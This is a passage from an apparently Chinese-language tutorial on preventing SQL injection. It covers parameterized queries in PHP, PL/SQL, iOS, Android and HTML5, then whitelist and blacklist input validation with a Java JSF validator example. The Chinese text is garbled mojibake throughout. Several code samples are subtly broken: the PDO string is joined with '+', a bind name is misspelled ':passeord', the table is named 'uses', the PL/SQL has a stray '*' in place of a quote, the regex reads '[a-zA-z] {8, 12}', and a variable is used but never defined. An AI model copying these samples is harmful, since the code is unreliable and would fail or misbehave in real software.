class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“åœ¨PHPä¸­ä½¿ç”¨PostgreSQLæ•°æ®åº“æ—¶ï¼ŒPHP 5.1.0å¼•å…¥äº†ä¸€ä¸ªç®€å•çš„æ–¹æ³•ä»¥ä¾¿ä½¿ç”¨å‚æ•°åŒ–çš„æŸ¥è¯¢è¯­å¥ã€‚è¯¥æ–¹æ³•åä¸ºpg_query_params(),å®ƒå…è®¸å¼€å‘äººå‘˜åœ¨åŒä¸€è¡Œä»£ç å†…æä¾›SQLæŸ¥è¯¢ å’Œå‚æ•°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query_params</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$1</span></span> AND password=<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PEAR::MDB2åŒ…æ˜¯ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨ä¸”ç‹¬ç«‹äºä¾›åº”å•†çš„æ•°æ®åº“è®¿é—®æ¡†æ¶ï¼ŒMDB2æ”¯æŒä½¿ç”¨å†’å·å­—ç¬¦çš„å‘½åå‚æ•°å’Œé—®å·å ä½ç¬¦ä¸¤ç§æ–¹å¼æ¥å®šä¹‰å‚æ•°ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$mdb2</span> <span class="token operator">=</span> <span class="token operator">&amp;</span> <span class="token class-name static-context">MDB2</span><span class="token operator">::</span><span class="token function">factory</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="token punctuation">;</span><span class="token variable">$types</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//è®¾ç½®æ•°æ®ç±»å‹</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mdb2</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token constant">MDS2_PREPARE_MANIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¦ä¼ é€’çš„å‚æ•°</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PDOåŒ…å«åœ¨PHP 5.1åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ã€‚å®ƒæ˜¯ä¸€ä¸ªé¢å‘å¯¹è±¡ä¸”ç‹¬ç«‹äºä¾›åº”å•†çš„æ•°æ®å±‚ï¼Œç”¨äºè®¿é—®æ•°æ®åº“ã€‚PDOæ—¢æ”¯æŒä½¿ç”¨å†’å·å­—ç¬¦çš„å‘½åå‚æ•°ï¼Œä¹Ÿæ”¯æŒä½¿ç”¨é—®å·å ä½ç¬¦å®šä¹‰çš„å‚æ•°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM uses WHERE username=:username AND"</span><span class="token operator">+</span><span class="token string double-quoted-string">"password=:password"</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»‘å®šå€¼å’Œæ•°æ®ç±»å‹</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':username'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':passeord'</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PL-SQLä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#PL-SQLä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="PL/SQLä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>PL/SQLä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>Oracle PL/SQLåŒæ ·æ”¯æŒåœ¨æ•°æ®åº“å±‚ä»£ç ä¸­ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ã€‚PL/SQLæ”¯æŒä½¿ç”¨å¸¦ç¼–å·çš„å†’å·å­—ç¬¦(ä¾‹å¦‚:1)æ¥ç»‘å®šå‚æ•°ã€‚ä½¿ç”¨å¸¦ç»‘å®šå‚æ•°çš„PL/SQLåœ¨åŒ¿åçš„ PL/SQLå—ä¸­æ„é€ å‚æ•°åŒ–è¯­å¥ï¼š</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">DECLARE</span> username varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password varchar2<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">result</span> integer<span class="token punctuation">;</span><span class="token keyword">BEGIN</span> <span class="token keyword">Execute</span> <span class="token keyword">immediate</span> <span class="token operator">*</span> <span class="token keyword">SELECT</span> <span class="token function">count</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token operator">:</span><span class="token number">1</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token operator">:</span><span class="token number">2</span>' <span class="token keyword">into</span> <span class="token keyword">result</span> <span class="token keyword">using</span> username<span class="token punctuation">,</span> password<span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç§»åŠ¨åº”ç”¨ä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#ç§»åŠ¨åº”ç”¨ä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="ç§»åŠ¨åº”ç”¨ä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>ç§»åŠ¨åº”ç”¨ä¸­çš„å‚æ•°åŒ–è¯­å¥</h3><p>åŸºäºiOSå’ŒAndroidçš„è®¾å¤‡éƒ½å…·æœ‰å†…å»ºäºè®¾å¤‡(in-device)çš„æ•°æ®åº“æ”¯æŒï¼Œå¹¶æä¾›äº†åˆ›å»ºã€æ›´æ–°å’ŒæŸ¥è¯¢è¿™äº›æ•°æ®åº“çš„APIã€‚</p><h4 id="iOSåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#iOSåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="iOSåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>iOSåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>å¯¹äºiOSç³»ç»Ÿï¼Œç”¨äºå¼€å‘åº”ç”¨çš„APIé€šè¿‡SQLiteåº“libsqlite3.dylibæ”¯æŒSQLiteã€‚å¦‚æœç›´æ¥ä½¿ç”¨SQLite(è€Œä¸æ˜¯é€šè¿‡Appleæ¡†æ¶Core Data),é‚£ä¹ˆæœ€æµè¡Œçš„æ¡†æ¶æ˜¯FMDBã€‚ä½¿ç”¨FMDBæ¡†æ¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨executeUpdate()æ–¹æ³•æ„å»ºå‚æ•°åŒ–çš„insertè¯­å¥ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">[db executeUpdate:@"INSERT INTO artists (name) VALUES (?)",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ä¹‹ç±»ä¼¼ï¼Œå¦‚æœæƒ³æŸ¥è¯¢æ•°æ®åº“ï¼Œå¯ä»¥ä½¿ç”¨executeQuery()æ–¹æ³•ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">FMResultSet *rs = [db executeQuery:@"SELECT * FROM songs WHERE artist=?",@"Sinead O'Connor"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Androidåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#Androidåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="Androidåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>Androidåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>Androidè®¾å¤‡ä¹ŸåŒ…å«äº†ç”¨äºè®¿é—®SQLiteæ•°æ®åº“å­ç³»ç»Ÿçš„AMã€‚è¯¥APIæ”¯æŒå‚æ•°åŒ–è¯­å¥ï¼Œå¼€å‘äººå‘˜å¯ä»¥åˆ†åˆ«æä¾›æŸ¥è¯¢å’Œæ•°æ®ã€‚</p><p>å¯¹äºinsertè¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨SQLiteStatementç±»ï¼š</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">statement = db.compileStatement("INSERT INTO artists (name) VALUES (?)");statement.bind(1, "Sinead O'Connor");statement.executeInsert();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å½“æŸ¥è¯¢æ•°æ®åº“æ—¶ï¼Œåªé¡»åœ¨SQLite-Databaseå¯¹è±¡ä¸Šç›´æ¥ä½¿ç”¨query()</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">db.query("songs",new String[ ] { "title" } /* columns to return */, "artist = ?" /* where clause */,new String [ ] { "Sinead O'Connor" } /* parameters to bind */,null /* group by */,null /* having */,null /* order by */);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTML5æµè§ˆå™¨å­˜å‚¨ä¸­çš„å‚æ•°åŒ–è¯­å¥"><a href="#HTML5æµè§ˆå™¨å­˜å‚¨ä¸­çš„å‚æ•°åŒ–è¯­å¥" class="headerlink" title="HTML5æµè§ˆå™¨å­˜å‚¨ä¸­çš„å‚æ•°åŒ–è¯­å¥"></a>HTML5æµè§ˆå™¨å­˜å‚¨ä¸­çš„å‚æ•°åŒ–è¯­å¥</h4><p>åœ¨HTML5æ ‡å‡†ä¸­å¯ä»¥ä½¿ç”¨ä¸¤ç§ç±»å‹çš„å­˜å‚¨â€”â€”Web SQL Databaseè§„èŒƒå’ŒWeb Storageè§„èŒƒã€‚è¯¥è§„èŒƒä¸­åŒ…å«äº†ä¸€ä¸ªç®€å•çš„æ–¹æ³•ç”¨äºåˆ›å»ºå‚æ•°åŒ–æŸ¥è¯¢ï¼Œå³ä½¿ç”¨executeSql())æ–¹æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">t<span class="token punctuation">.</span>executeSql<span class="token punctuation">(</span><span class="token string">'SELECT * FROM songs WHERE artist=? AND song=?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>artist<span class="token punctuation">,</span> songName<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token keyword">data</span><span class="token punctuation">)</span> {<span class="token comment">//å¯¹æ•°æ®æ‰§è¡ŒæŸäº›æ“ä½œ</span>}<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œtä»£è¡¨äº‹åŠ¡(transaction), SQLè¯­å¥å°†åœ¨è¯¥äº‹åŠ¡ä¸­æ‰§è¡Œã€‚åœ¨SQLè¯­å¥ä¸­ä½¿ç”¨é—®å·ä½œä¸ºå ä½ç¬¦ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå‚æ•°æ•°ç»„ï¼Œè¯¥æ•°ç»„ä¸­å…ƒç´ çš„é¡ºåºå°±æ˜¯è¿™äº›å‚æ•°åº”ç”¨äºSQL è¯­å¥çš„é¡ºåºã€‚æœ€åä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†ä»æ•°æ®åº“è¿”å›çš„æ•°æ®ã€‚</p><p>Web Storageè§„èŒƒåˆ™ä½¿ç”¨setltem()ã€getltem()å’Œremoveltem()ç­‰æ–¹æ³•ï¼Œæä¾›äº†ä¸€ç§ç®€å•çš„é”®/å€¼å¯¹çš„å­˜å‚¨æ–¹å¼ã€‚åœ¨è¯¥è§„èŒƒä¸­å¹¶æ²¡æœ‰é€šè¿‡å­—ç¬¦ä¸²è¿æ¥æ¥æ„å»ºè¯­å¥çš„æŸ¥è¯¢è¯­è¨€ï¼Œå› æ­¤ç±»ä¼¼äºSQL æ³¨å…¥è¿™æ ·çš„æ”»å‡»å¯¹Web Storageæ— æ•ˆã€‚</p><h3 id="è¾“å…¥éªŒè¯"><a href="#è¾“å…¥éªŒè¯" class="headerlink" title="è¾“å…¥éªŒè¯"></a>è¾“å…¥éªŒè¯</h3><p>è¾“å…¥éªŒè¯æ˜¯æŒ‡æµ‹è¯•åº”ç”¨ç¨‹åºæ¥æ”¶åˆ°çš„è¾“å…¥ï¼Œä»¥ä¿è¯å…¶ç¬¦åˆåº”ç”¨ç¨‹åºä¸­æ ‡å‡†å®šä¹‰çš„è¿‡ç¨‹ã€‚å®ƒå¯ä»¥ç®€å•åˆ°å°†å‚æ•°é™åˆ¶æˆæŸç§ç±»å‹ï¼Œä¹Ÿå¯ä»¥å¤æ‚åˆ°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ–ä¸šåŠ¡é€»è¾‘æ¥éªŒè¯è¾“å…¥ã€‚</p><p>ç™½åå•éªŒè¯(æœ‰æ—¶ç§°ä¸ºåŒ…å«éªŒè¯æˆ–æ­£éªŒè¯)å’Œé»‘åå•éªŒè¯(æœ‰æ—¶ç§° ä¸ºæ’é™¤éªŒè¯æˆ–è´ŸéªŒè¯)ã€‚</p><h4 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h4><p>ç™½åå•éªŒè¯æ˜¯åªæ¥æ”¶å·²è®°å½•åœ¨æ¡ˆçš„è‰¯å¥½è¾“å…¥çš„æ“ä½œã€‚</p><p>è¦ç‚¹:</p><p>è¾“å…¥çš„æ•°æ®æ˜¯å¦åœ¨ç™½åå•è§„åˆ™å†…</p><p>æ•°æ®ç±»å‹æ˜¯å¦æ»¡è¶³</p><p>æ•°æ®å¤§å°æ˜¯å¦æ­£ç¡®</p><p>æ•°æ®èŒƒå›´</p><p>æ•°æ®å†…å®¹</p><p>å®ç°å†…å®¹éªŒè¯çš„å¸¸ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#éªŒè¯å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«ç¾å›½é‚®æ”¿ç¼–ç ï¼š</span>^<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">(</span>-<span class="token punctuation">\</span>d<span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span>?$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¯¥æ­£åˆ™è¡¨è¾¾å¼æŒ‰ä¸‹åˆ—è§„åˆ™åŒ¹é…5ä½å’Œ5ä½åŠ 4ä½çš„é‚®æ”¿ç¼–ç ï¼š</p><p>^\d{5}ï¼šå‡†ç¡®åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´çš„5ä½æ•°å­—</p><p>(-\d{4})?ï¼šå‡†ç¡®åŒ¹é…å¯èƒ½å­˜åœ¨ï¼ˆå‡ºç°ï¼‰æˆ–å®Œå…¨ä¸å­˜åœ¨ï¼ˆæœªå‡ºç°ï¼‰çš„ç ´æŠ˜å·å­—ç¬¦åŠ 4ä½æ•°å­—ã€‚</p><p>$:å‡ºç°åœ¨å­—ç¬¦ä¸²æœ«å°¾ã€‚å¦‚æœå­—ç¬¦ä¸²æœ«å°¾åŒ…å«é™„åŠ çš„å†…å®¹ï¼Œæ­£åˆ™è¡¨è¾¾å¼å°†ä¸åŒ¹é…ã€‚</p><p>è®¾è®¡è¾“å…¥éªŒè¯å’Œå¤„ç†ç­–ç•¥</p><ul><li><p>åœ¨åº”ç”¨ç¨‹åºè¾“å…¥å±‚ä½¿ç”¨ç™½åå•è¾“å…¥éªŒè¯ä»¥ä¾¿éªŒè¯æ‰€æœ‰ç”¨æˆ·è¾“å…¥éƒ½ç¬¦åˆåº”ç”¨è¦æ¥ æ”¶çš„å†…å®¹ã€‚åº”ç”¨åªå…è®¸æ¥æ”¶ç¬¦åˆæœŸæœ›æ ¼å¼çš„è¾“å…¥ã€‚</p></li><li><p>åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸ŠåŒæ ·æ‰§è¡Œç™½åå•è¾“å…¥éªŒè¯ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢ä¸ºç”¨æˆ·è¾“å…¥ä¸å¯æ¥ æ”¶çš„æ•°æ®æ—¶æœåŠ¡å™¨å’Œæµè§ˆå™¨é—´çš„å¾€è¿”ä¼ é€’ã€‚ä¸èƒ½å°†è¯¥æ“ä½œä½œä¸ºå®‰å…¨æ§åˆ¶æ‰‹æ®µï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ¥è‡ªç”¨æˆ·æµè§ˆå™¨çš„æ‰€æœ‰æ•°æ®ã€‚</p></li><li><p>åœ¨Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰å±‚ä½¿ç”¨é»‘åå•å’Œç™½åå•è¾“å…¥éªŒè¯ï¼ˆä»¥æ¼æ´â€œç­¾åâ€å’Œâ€œæœ‰ ç»éªŒâ€è¡Œä¸ºçš„å½¢å¼ï¼‰ä»¥ä¾¿æä¾›å…¥ä¾µæ£€æµ‹/é˜»æ­¢åŠŸèƒ½å’Œç›‘è§†åº”ç”¨æ”»å‡»ã€‚</p></li><li><p>åœ¨åº”ç”¨ç¨‹åºä¸­è‡ªå§‹è‡ªç»ˆåœ°ä½¿ç”¨å‚æ•°åŒ–è¯­å¥ä»¥ä¿è¯æ‰§è¡Œå®‰å…¨çš„SQLæ‰§è¡Œã€‚</p></li><li><p>åœ¨æ•°æ®åº“ä¸­ä½¿ç”¨ç¼–ç æŠ€æœ¯ä»¥ä¾¿åœ¨åŠ¨æ€SQLä¸­ä½¿ç”¨è¾“å…¥æ—¶å®‰å…¨åœ°å¯¹å…¶ç¼–ç ã€‚</p></li><li><p>åœ¨ä½¿ç”¨ä»æ•°æ®åº“ä¸­æå–çš„æ•°æ®ä¹‹å‰æ°å½“åœ°å¯¹å…¶è¿›è¡Œç¼–ç ã€‚ä¾‹å¦‚ï¼Œå°†æµè§ˆå™¨ä¸­æ˜¾ç¤ºçš„æ•°æ®é’ˆå¯¹è·¨ç«™è„šæœ¬è¿›è¡Œç¼–ç ã€‚</p></li></ul><h5 id="ç”¨å·²çŸ¥å€¼è¿›è¡Œæ£€éªŒ"><a href="#ç”¨å·²çŸ¥å€¼è¿›è¡Œæ£€éªŒ" class="headerlink" title="ç”¨å·²çŸ¥å€¼è¿›è¡Œæ£€éªŒ"></a>ç”¨å·²çŸ¥å€¼è¿›è¡Œæ£€éªŒ</h5><p>å°†è¾“å…¥å€¼ä¸ä¸€ä¸ªæœ‰æ•ˆå€¼çš„åˆ—è¡¨è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœè¾“å…¥å€¼ä¸åœ¨åˆ—è¡¨ä¸­ï¼Œå°±æ‹’ç»è¯¥è¾“å…¥ï¼Œè¿™æ˜¯ä¸€ç§å¼ºå¤§ä½†å¸¸å¸¸æœªè¢«å……åˆ†åˆ©ç”¨çš„æ£€éªŒè¾“å…¥å€¼çš„æ–¹æ³•ã€‚é€šè¿‡å°†å€¼ä¸ä¸€ä¸ªåˆ—è¡¨è¿›è¡Œæ¯”è¾ƒï¼Œå¯ä»¥å®Œå…¨æ§åˆ¶å¯èƒ½çš„è¾“å…¥å€¼ä»¥åŠè¾“å…¥å¯èƒ½é€šè¿‡çš„ä»£ç è·¯å¾„ã€‚</p><p>é—´æ¥è¾“å…¥(input indirection)æ˜¯å¦ä¸€ç§ç”¨å·²çŸ¥å€¼è¿›è¡Œæ£€éªŒçš„æ–¹æ³•ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼ŒæœåŠ¡å™¨ç«¯å¹¶ä¸æ¥æ”¶ç›´æ¥æ¥è‡ªå®¢æˆ·ç«¯çš„å€¼ï¼Œå®¢æˆ·ç«¯å‘ˆç°ä¸€ä¸ªå…è®¸å€¼çš„åˆ—è¡¨ï¼Œå¹¶å‘æœåŠ¡å™¨ç«¯æäº¤é€‰ä¸­å€¼çš„ç´¢å¼•ã€‚</p><h4 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h4><p>é»‘åå•éªŒè¯æ˜¯åªæ‹’ç»å·±è®°å½•åœ¨æ¡ˆçš„ä¸è‰¯è¾“å…¥çš„æ“ä½œï¼Œå®ƒé€šè¿‡æµè§ˆè¾“å…¥çš„å†…å®¹æ¥æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å·±çŸ¥çš„ä¸è‰¯å­—ç¬¦ã€å­—ç¬¦ä¸²æˆ–æ¨¡å¼ã€‚</p><p>åœ¨ä½¿ç”¨é»‘åå•çš„åŒæ—¶ç»“åˆä½¿ç”¨è¾“å‡ºç¼–ç ä»¥ä¿è¯å¯¹ä¼ é€’åˆ°å…¶ä»–ä½ç½®ï¼ˆæ¯”å¦‚ï¼Œä¼ é€’ç»™æ•°æ®åº“ï¼‰çš„è¾“å…¥è¿›è¡Œé™„åŠ æ£€æŸ¥ï¼Œä»è€Œä¿è¯èƒ½æ­£ç¡®åœ°å¤„ç†è¯¥è¾“å…¥ä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚</p><h4 id="Javaä¸­çš„è¾“å…¥éªŒè¯"><a href="#Javaä¸­çš„è¾“å…¥éªŒè¯" class="headerlink" title="Javaä¸­çš„è¾“å…¥éªŒè¯"></a>Javaä¸­çš„è¾“å…¥éªŒè¯</h4><p>Javaä¸­çš„è¾“å…¥éªŒè¯æ”¯æŒä¸“å±äºæ­£åœ¨ä½¿ç”¨çš„æ¡†æ¶ã€‚</p><p>å®šä¹‰ä¸€ä¸ªè¾“å…¥éªŒè¯ç±»ï¼Œè¯¥ç±»å®ç°äº†<code>javax.faces.validator.Validator</code>æ¥å£</p><p>è¯·å‚è€ƒä¸‹åˆ—ä»£ç ç‰‡æ®µå¹¶å°†å…¶ä½œä¸ºéªŒè¯JSF(Java Server Faces, JSF)ä¸­ç”¨æˆ·åçš„ä¾‹å­</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UsernameValidator</span> <span class="token keyword">implements</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token class-name">FacesContext</span> facesContext<span class="token punctuation">,</span><span class="token class-name">UIComponent</span> uIComponent<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">{</span><span class="token comment">//è·å–ç”¨æˆ·åå¹¶è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span><span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>value<span class="token punctuation">;</span><span class="token comment">//å»ºç«‹æ­£åˆ™è¡¨è¾¾å¼</span><span class="token class-name">Pattern</span> p <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span>compile <span class="token punctuation">(</span><span class="token string">"^[a-zA-z] {8, 12}$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŒ¹é…ç”¨æˆ·å</span><span class="token class-name">Matcher</span> m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>matchFound<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">FacesMessage</span> message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FacesMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setDetail</span><span class="token punctuation">(</span><span class="token string">"Not valid - it must be 8-12 letter only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setSummary</span><span class="token punctuation">(</span><span class="token string">"Username not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setseverity</span><span class="token punctuation">(</span><span class="token class-name">FacesMessage</span><span class="token punctuation">.</span><span class="token constant">SEVERITY_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦å°†ä¸‹åˆ—å†…å®¹æ·»åŠ åˆ°faces-config.xmlæ–‡ä»¶ä¸­ä»¥ä¾¿å¯ç”¨ä¸Šè¿°éªŒè¯å™¨</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-id</span><span class="token punctuation">&gt;</span></span>namespace.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator-id</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-class</span><span class="token punctuation">&gt;</span></span>namespace.package.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validatorclass</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å¯ä»¥åœ¨ç›¸å…³çš„JSPæ–‡ä»¶ä¸­å¼•ç”¨åœ¨faces-config.xmlæ–‡ä»¶ä¸­æ·»åŠ çš„å†…å®¹</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;h:inputText value="username" id="username"required="true"&gt;&lt;f:validatorvalidatorId="namespace.UsernameValidator" /&gt;&lt;/h:inputText&gt;<span aria-hidden="true" 